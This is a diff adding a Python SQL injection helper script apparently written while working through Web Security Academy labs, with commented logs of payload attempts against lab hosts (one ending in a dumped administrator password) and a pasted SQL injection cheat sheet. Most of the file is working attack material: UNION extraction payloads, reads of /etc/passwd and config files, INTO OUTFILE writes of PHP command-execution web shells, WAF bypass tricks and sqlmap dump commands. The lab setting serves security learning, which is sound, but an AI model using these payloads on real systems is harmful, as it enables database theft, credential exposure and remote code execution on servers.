@@ -1,0 +1,414 @@
+import requests
+import time
+'''
+This script can be used to build sqli payloads.
+'''
+
+#This string reminds you of what the goal is so you dont get off track!
+#Make sure you add a goal!
+goal = "Blind SQL injection with conditional responses. Log in as administrator."
+#verify is set to false in the request, so it won't 
+burp_proxy = {
+	"https":"http://127.0.0.1:8080",
+	"http" :"http://127.0.0.1:8080"
+}
+
+#disable ssl warnings
+requests.urllib3.disable_warnings()
+
+#all payloads are strings, even ints.
+payloads = [
+  "'",#...............0
+  "''",#..............1
+  "0",#...............2
+  "1",#...............3
+  "=1",#..............4
+  "+OR+1=1",#.........5
+  "+AND+1=1",#........6
+  "+UNION+SELECT+",#..7
+  "+OR+1=1--",#.......8
+  "+OR+1=1#",#........9
+  "foo'||'bar",#......10
+  "'test'",#..........11
+  "+--+",#............12
+  "+#",#..............13
+  "+sleep(10)+",#.....14
+  "+wait+00:00:10+",#.15
+  "+",#...............16
+  "NULL",#............17
+  ",",#...............18
+  "ORDER+BY+",#.......19
+]
+
+#SCRATCH PAD FOR BUILDING:
+# '+ORDER+BY+1'--
+
+#this provides a baseline for db interaction. this defines success and whether a query is valid.
+base_url = "https://target-ac201fe91fbd4f53801f0a8c000500be.web-security-academy.net/filter?category=Corporate+gifts"
+
+#this is is where you set payloads to use from the payloads list
+current_payloads = [
+#  payloads[0],payloads[7],payloads[17],payloads[12],payloads[0],payloads[13],]
+#  payloads[0],payloads[7],payloads[17],payloads[12],payloads[0],payloads[13],]
+
+#WORKFLOW: SQL injection attack, querying the database type and version on Oracle
+#"+OR+1=1--",] #==>                                200 OK query is good. parameter appears to be injectable.
+#"+AND+1=1--",] #==> 200 OK
+#"+AND+SELECT+1=1--",] #==> 200 OK
+#"'+UNION+SELECT+1,1,1,1,1,1,1#",] #==>
+#"'+UNION+SELECT+1,1#",] #==>
+#r"'+SELECT+''+FROM+dual+--"]#==>                  500 Internal Server Error. bad query, missing UNION. expect error.
+#r"'+UNION+SELECT+NULL+FROM+dual+--"]#==>          500 Internal Server Error, but query is syntactically correct.
+#r"'+UNION+SELECT+NULL,NULL+FROM+dual+--"]#==>     200 OK! Confirmed 2 columns, and dbms is oracle bc is recognizes 'dual.'
+#r"'+UNION+SELECT+NULL,NULL,NULL+FROM+dual+--"]#==>500 Internal Server Error. Double checking that there are 2 rows, now 3.
+#r"'+UNION+SELECT+'',NULL+FROM+dual+--"]#==>       200 OK. Checking data type of each column. 1st column accepts strings.
+#r"'+UNION+SELECT+'',''+FROM+dual+--"]#==>         200 OK. Test if the second column accepts strings. Need to query another table for 2 string columns.
+#r"'+UNION+SELECT+v$version,NULL+FROM+dual+--"]#==> 500 Internal Server Error. Incorrect syntax.
+#r"'+UNION+SELECT+'',NULL+FROM+v$version+--"]#==>   200 OK, BUT version is not displayed...Maybe it's different for this version.
+#r"'+UNION+SELECT+banner,NULL+FROM+v$version+--"]#==>200 OK! Solved!
+
+#WORKFLOW: SQL injection attack, querying the database type and version on MySQL and Microsoft
+#"'OR+1=1--",] #==>                                 200 OK / 500 Internal Server Error
+#r"'+SELECT+''+--"]#==>                             200 OK. Everything working in my favor so far.
+#r"'+SELECT+@@version+--"]#==>                       200 OK. Could be mysql or ms sql...or completely blind. no errors yet.
+#r"'+ORDER+BY+1+--"]#==>                           200 ok...
+#r"'+ORDER+BY+10+--"]#==>                           200 ok...
+#r"'+UNION+SELECT+@@version+--"]#==>                 200 ok...
+#r"'+UNION+SELECT+@@version,NULL+--"]#==>             200 ok...
+#r"'+UNION+SELECT+@@version,NULL+#"]#==>             200 ok...
+#r"'+UNION+SELECT+@@version,+NULL+#"]#==>             200 ok...
+#r"'+UNION+SELECT+@@version,+NULL#"]#==>             200 ok...
+#making sure payload is url encoded since im not seeing any changes.
+#requests.utils.quote("'+UNION+SELECT+NULL,@@version#--")]#==>             200 ok...
+#requests.utils.quote("0''+UNION+SELECT+NULL,@@version#--")]#==>200 ok...
+#r"'+UNION+SELECT+@@version,+NULL#"]#==> removed Accessories, so its just category=
+#!!!MY PAYLOADS WERE STILL COMMENTED OUT FROM PULLING THE BASE URL!!!
+#requests.utils.quote("' UNION SELECT @@version, NULL#")]#==> 200 ok. SUCCESS! version retrieved!! STOP USING '+' TO CONCAT STRINGS. URL ENCODE.
+
+#r"'+UNION+SELECT+NULL+FROM+dual+--"]#==>          500 Internal Server Error, but query is syntactically correct.
+#r"'+UNION+SELECT+NULL,NULL+FROM+dual+--"]#==>     200 OK! Confirmed 2 columns, and dbms is oracle bc is recognizes 'dual.'
+#r"'+UNION+SELECT+NULL,NULL,NULL+FROM+dual+--"]#==>500 Internal Server Error. Double checking that there are 2 rows, not 3.
+#r"'+UNION+SELECT+'',NULL+FROM+dual+--"]#==>       200 OK. Checking data type of each column. 1st column accepts strings.
+#r"'+UNION+SELECT+'',''+FROM+dual+--"]#==>         200 OK. Test if the second column accepts strings. Need to query another table for 2 string columns.
+#r"'+UNION+SELECT+v$version,NULL+FROM+dual+--"]#==> 500 Internal Server Error. Incorrect syntax.
+#r"'+UNION+SELECT+'',NULL+FROM+v$version+--"]#==>   200 OK, BUT version is not displayed...Maybe it's different for this version.
+#r"'+UNION+SELECT+banner,NULL+FROM+v$version+--"]#==>200 OK! Solved! #banner is a column in the v$version table? need to improve sql skills.
+
+
+# WORKFLOW: 
+# SQL injection attack, listing the database contents on non-Oracle databases
+#see mysql notes and pg sql notes
+
+#WORKFLOW: SQL injection attack, listing the database contents on Oracle
+#requests.utils.quote("'")]#==>500 Internal Server Error
+#requests.utils.quote("''")]#==>200 OK
+#requests.utils.quote("' ORDER BY 1';--")]#==>500 Internal Server Error
+#requests.utils.quote(" ORDER BY 1;--")]#==>200 OK
+#requests.utils.quote(" ORDER BY 10;--")]#==>200 OK
+#requests.utils.quote(" ORDER BY 100;--")]#==>200 OK
+#requests.utils.quote("'||'ORDER BY 1;--")]#==>200 OK
+#requests.utils.quote("'' UNION SELECT TABLE_NAME FROM ALL_TAB_COLUMNS --")]#==>200 OK
+#requests.utils.quote(" UNION SELECT TABLE_NAME FROM ALL_TABLES #")]#==>200 OK
+#requests.utils.quote("' UNION SELECT NULL FROM ALL_TABLES #--")]#==>500 Internal Server Error
+#requests.utils.quote("' UNION SELECT 1 FROM ALL_TABLES #--")]#==>500 Internal Server Error
+#requests.utils.quote("'' UNION SELECT NULL FROM dual#--")]#==>500
+#requests.utils.quote("' UNION SELECT NULL FROM dual#--")]#==>500
+#requests.utils.quote(" UNION SELECT NULL FROM dual#--")]#==>200
+#requests.utils.quote("'' UNION SELECT NULL,NULL FROM dual#--")]#==>200
+#requests encoding NOT WORKING FOR ORACLE
+#"'+UNION+SELECT+'TEST','TEST'+FROM+dual--"]#==>200 OK. test TEST reflected.
+#"'+UNION+SELECT+'TEST','TEST'+FROM+all_table--"]#==>500 
+#"'+UNION+SELECT+null,null+FROM+all_tables--"]#==>200 OK
+#"'+UNION+SELECT+table_names,NULL+FROM+all_tables--"]#==>500 Syntax error. table_name is singular.
+#"'+UNION+SELECT+table_name,NULL+FROM+all_tables--"]#==>200 OK. Tables names returned in response. table USERS_KFQRPX
+#"'+UNION+SELECT+all_tab_columns+WHERE+table_name='USERS_KFQRPX'--"]#==>500 forgot from. syntax error.
+#"'+UNION+SELECT+column_name+FROM+all_tab_columns+WHERE+table_name='USERS_KFQRPX'--"]#==>500 only requested one column
+#"'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_KFQRPX'--"]#==>200 OK. columns USERNAME_QLQRJK, PASSWORD_NKCAJW
+#"'+UNION+SELECT+USERNAME_QLQRJK,PASSWORD_NKCAJW+FROM+USERS_KFQRPX--"]#==>200 OK. SUCCESS! All passwords returned. administrator:a79j44avqwsf19b9bkh8
+
+#WORKFLOW:Blind SQL injection with conditional responses
+#""#==>200 ok. no payload. use this as a baseline. NO Welcome back in this response.
+#requests.utils.quote("'")#==>200 ok. YES welcome back in response.
+#requests.utils.quote("' SELECT 'A'--")#==> 200 OK. NO welcome back
+#requests.utils.quote("' SELECT 'A' FROM dual--")#==> 200 NO
+#requests.utils.quote("' ORDER BY 100--")#==>200 NO
+#requests.utils.quote("' SELECT 'A'--")#==> 200 NO
+#requests.utils.quote("'||SELECT||'A'||FROM||dual--")#==>200 NO
+#"' SELECT sleep(10)--"#==>200 NO
+#requests.utils.quote("' SELECT 'A' FROM dual--")#==>200 NO
+#requests.utils.quote("'+UNION+SELECT+'A'--")#==>200 NO
+("'")#==>
+
+]
+
+#comment out payload for baseline (first run)
+level1_url = base_url+(''.join(current_payloads)) #dont forget to update cookie, too.
+
+
+level1_cookies = {"session": "DfAD49mjjrNwfyrNn4hplwKnpZzMF3Dm"}
+
+level1_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0;) Gecko/20100101 Firefox/90.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://target-ac341fce1e01cf3580a92cd600c90042.web-security-academy.net", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Dnt": "1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
+
+#level1_data = {"user": "not vulnerable", "password": "not vulnerable", "login": "Login"}
+
+#time the request for truly blind, timing-based sqli attacks.
+start = time.perf_counter()
+r = requests.get(url=level1_url, headers=level1_headers, cookies=level1_cookies, verify=False)#add proxy after url: proxies=burp_proxy,  # data=level1_data, verify='C:\\Users\\%USERNAME%\\Downloads\\burp_cert_requests.der')  #add burp certificate
+stop = time.perf_counter()
+request_time = stop-start
+
+#print all the info
+print("GOAL: ",goal)
+print("-"*50)
+print("Full URL: "+level1_url)
+print(r,r.reason)
+print("-"*50)
+print("Time to process request : ")
+print(f"Milliseconds : {(request_time)*1000:0.4f}")
+print(f"Seconds : {request_time:0.4f}")
+print("-"*50)
+#use the following to check for a string.
+print("'Welcome back!' in response : "+str("Welcome back!" in r.text))
+print("'is-solved' in response : "+str("is-solved" in r.text))
+print("Payload : "+(''.join(current_payloads)))
+print("Payload reflected in response? : "+str((current_payloads[0]) in r.text))
+print("-"*50)
+print("Headers : ")
+#pretty printed headers. also, strip curly braces...im sure there is a better way.
+print(str(str(r.headers).replace("',", "',\n")[1:-1]))
+print("\n")
+#print(r.text)
+
+
+
+######################CHEAT SHEET FROM COBALT & OTHERS####################
+#
+# SQL Injection Cheatsheet
+# Below you will find my cheatsheet for exploiting SQL Injection:
+# 
+# String Concatenation & Comments
+# --------------|--------------------|-----------|-------------------- 
+#               | MySQL              | MySQL     | PostgreSQL 
+# --------------|--------------------|-----------|--------------------
+# String Concat:| 'foo' 'bar'        |'foo'+'bar'| 'foo'||'bar'  
+#               | CONCAT('foo','bar')|           |               
+# --------------|--------------------|-----------|-------------------
+# Comments:     | #                  | --        |  --           
+#               | --                 | /*aaa*/   | /*aaa*/       
+#               | -- -               |           |               
+#               | /*aaa*/            |           |               
+# --------------|--------------------|-----------|--------------------
+# 
+#               | Oracle
+# --------------|-----------------------------------------------------      
+# String Concat:| 'foo'||'bar
+#               | CONCAT('foo','bar')       
+# --------------|-----------------------------------------------------
+# Comments:     | --
+#               |
+# --------------|-----------------------------------------------------
+# Manual Exploitation
+# -----------|--------------------------------------------------------     
+# Detection: | aa' --
+#            | aa' #
+#            | aa'/*
+#            | ' or 1=1--
+#            | ' or 1=1#
+#            | ' or 1=1/*
+#            | ') or '1'='1--
+#            | ') or ('1'='1--
+# -----------|--------------------------------------------------------
+# Number     | ?id=1 order by <number> #
+# of columns:| (Keep increasing number until you get an error, 
+#            | the last number that doesn’t give you an error
+#            | is the # of columns)
+# -----------|--------------------------------------------------------
+# Version:   | ?id=1 union select 1,version(),3,4 #
+#            | id=1 UNION SELECT null,@@version,null,null
+#            | id=3 and substring(@@version,1,1)=4
+#            | id=3 and substring(@@version,1,1)=5
+#            | id=3 union all select 1,2,@@version,4/*
+# -----------|--------------------------------------------------------
+# Current    | ?id=1 union select 1,2,user(),4 #
+# users:     | SELECT user(); **(Mysql)**
+#            | SELECT system_user(); **(Mysql, MSSQL)**
+#            | SELECT user_name(); **(MSSQL)**
+#            | SELECT user; **(MSSQL, PostgreSQL)**
+#            | SELECT current_user; **(PostgreSQL)**
+#            | SELECT user FROM dual **(Oracle)**
+#            | ') or ('1'='1--
+# -----------|--------------------------------------------------------
+# Tables:    | ?id=2 union select 1,table_name,3,4 
+#            | from information_schema.tables
+#            | SELECT * FROM information_schema.tables **(MySQL)**
+#            | SELECT * FROM information_schema.tables **(MSSQL)**
+#            | SELECT * FROM information_schema.tables **(PostgreSQL)**
+#            | SELECT * FROM all_tables **(Oracle)**
+# -----------|--------------------------------------------------------
+# Columns:   | ?id=2 union select 1,column_name,3,4 from 
+#            | information_schema.columns where table_name='users'
+#            | SELECT * FROM information_schema.columns
+#            | WHERE table_name = 'table-name' **(MySQL)**
+#            | SELECT * FROM information_schema.columns
+#            | WHERE table_name = 'table-name' **(MSSQL)** 
+#            | SELECT * FROM information_schema.columns
+#            | WHERE table_name = 'table-name' **(PostgreSQL)**
+#            | SELECT * FROM all_tab_columns
+#            | WHERE table_name = 'table-name' **(Oracle)**
+# -----------|--------------------------------------------------------
+# Time-Based:| SELECT sleep(10) **(MySQL)
+#            | WAITFOR DELAY ‘0:0:10’ **(MSSQL)
+#            | SELECT pg_sleep(10) **(PostgreSQL)
+#            | dbms_pipe.receive_message((‘a’),10) **(Oracle)
+# -----------|--------------------------------------------------------
+# Blind      | ?id=3
+# Injection: | ?id=3 and 1=1 **(no error)
+#            | ?id=3 and 1=2 **(error)
+# -----------|--------------------------------------------------------
+# Extracting | cat.php?id=2 union select
+# Data:      | 1,**concat(**login,0x3a,password**)**,3,4 from users
+# --------------------------------------------------------------------
+# Reading files:
+# 
+# ‘ union select 1,2,3, load_file(‘/etc/passwd’) ,5,6,7,8 — -
+# 
+# ‘ union select 1,2,3, load_file(‘/var/www/login.php’) ,5,6,7,8 — -
+# 
+# ‘ union select 1,2,3, load_file(‘/var/www/includes/config.inc.php’) ,5,6,7,8 — -
+# 
+# ‘ union select 1,2,3, load_file(‘/var/www/mysqli_connect.php’) ,5,6,7,8 — -
+# 
+# --------------------------------------------------------------------
+# 
+# Uploading files:
+# 
+# ‘ union select 1,2,3, ‘this is a test message’ ,5,6,7,8 into outfile ‘/var/www/test’ — -
+# 
+# ‘ union select 1,2,3, load_file(‘/var/www/test’) ,5,6,7,8 — -
+# 
+# ‘ union select null,null,null, “<?php system($_GET[‘cmd’]) ?>” ,5,6,7,8 into outfile ‘/var/www/shell.php’ — -
+# 
+# ‘ union select null,null,null, load_file(‘/var/www/shell.php’) ,5,6,7,8 — -
+# 
+# --------------------------------------------------------------------
+# 
+# Command Execution:
+# 
+# # windows
+# ?id=1 union all select 1,2,3,4,”<?php echo shell_exec($_GET[‘cmd’]);?>”,6,7,8,9 into OUTFILE ‘c:/xampp/htdocs/cmd.php’
+# 
+# # linux
+# ?id=1 union all select 1,2,3,4,”<?php echo shell_exec($_GET[‘cmd’]);?>”,6,7,8,9 into OUTFILE ‘/var/www/html/cmd.php’
+# 
+# -------------------------------------------------------------------
+# WAF Bypass
+# -----------|--------------------------------------------------------      
+# Replacing  | **/**/
+# Space:     | +
+           # | /*! */
+           # | /*!50000 */
+           # | /*!1234 */
+           # | /*--*/
+# -----------|--------------------------------------------------------
+# Bypass     | uNiOn (change upper-lower case)
+# filters for| unUNIONion (write words in the keyword)
+# keywords:  | %55nIoN %53eLeCt (URL encode letters - U & S in these       
+           # | cases)
+           # | Add followings around the words 
+           # | **/*!50000**XXXXXX***/** /*!50000UniON SeLeCt*/
+# -----------|--------------------------------------------------------
+# Version:   | ?id=1 union select 1,version(),3,4 #
+           # | id=1 UNION SELECT null,@@version,null,null
+           # | id=3 and substring(@@version,1,1)=4
+           # | id=3 and substring(@@version,1,1)=5
+           # | id=3 union all select 1,2,@@version,4/*
+# -----------|-------------------------------------------------------- 
+# # of       | **/**/**ORDER**/**/**BY**/**/**
+# columns:   | **/*!**order***/+/***!by***/
+# (By order) | **/*!**ORDER BY***/**
+           # | **/*!50000**ORDER BY***/
+           # | /*!50000**ORDER***//**//*!50000**BY***/
+           # |  /*!12345**ORDER***/+/*!**BY***/**
+# --------------------------------------------------------------------
+# 
+# SQLMAP - Use Tamper Scripts to Bypass WAF:
+# 
+# sqlmap -r login.req --dbms=mysql  --level 3 --risk 3 --timeout 100 --flush-session --technique=B --time-sec=2 --dbs --threads 10 --tamper=between,informationschemacomment,bluecoat,charencode --drop-set-cookie --fresh-queries --binary-fields -identify-waf
+# 
+# -------------------------------------------------------------------
+# SQLMAP - Tamper Scripts:
+# 
+# tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+# 
+# -------------------------------------------------------------------
+# SQLMAP - MSSQL Tamper Scripts:
+# 
+# tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+# 
+# -------------------------------------------------------------------
+# SQLMAP - MYSQL Tamper Scripts:
+# 
+# tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+# 
+# --------------------------------------------------------------------
+# For more details on how to bypass a WAF you can check out my new video series Hacking How-To: SQL Injection (SQLi) All-in-One Part 2:
+# 
+# 
+# SQLMAP
+# -------------------------------------------------------------------
+# Crawl the page:
+# 
+# sqlmap -u http://.. --dbms=mysql --crawl=3
+# 
+# sqlmap -u http://<targetip> --forms --batch --crawl=10 --cookie=jsessionid=54321 --level 4 --risk 3
+# 
+# -------------------------------------------------------------------
+# Specify parameter in the saved request file:
+# 
+# sqlmap -r login.req -p Password --dbms=mssql -v 3  --batch --level 5 --risk 3
+# 
+# -------------------------------------------------------------------
+# List DBs:
+# 
+# sqlmap -r request.txt --level 4 --risk 3 --dbms=mysql --batch -p <parameter> --dbs
+# 
+# -------------------------------------------------------------------
+# List tables:
+# 
+# sqlmap -r request.txt --level 4 --risk 3 --dbms=mysql --batch -p <parameter> -D <dbname> --tables
+# 
+# --------------------------------------------------------------------
+# Dump column data:
+# 
+# sqlmap -r request.txt --level 4 --risk 3 --dbms=mysql --batch -p <parameter> -D <dbname> -T <tables> --dump
+# 
+# --------------------------------------------------------------------
+# Force usage of SSL/HTTPS:
+# 
+# python sqlmap.py -r a.req --force-ssl --users
+# 
+# --------------------------------------------------------------------
+# For a walkthrough on how to exploit a SQLi vulnerability using SQLmap check out my new video series, Hacking How-To: SQL Injection (SQLi) All-in-One Part 1:
+# 
+# 
+# Some Explanations for sqlmap options:
+# 
+# — batch: Never ask for user input, use the default behavior
+# 
+# — crawl: Crawl the website starting from the target URL
+# 
+# — level: Level of tests to perform (1–5, default 1)
+# 
+# — risk: Risk of tests to perform (1–3, default 1)
+# 
+# — dbms: Force back-end DBMS to provided value
+# 
+# — dump: Dump DBMS database table entries
+# 
+# — force-ssl: Force usage of SSL/HTTPS
+# 
+# For more options, please refer to the official sqlmap guide: https://github.com/sqlmapproject/sqlmap/wiki/Usage
+# 
+
+
+
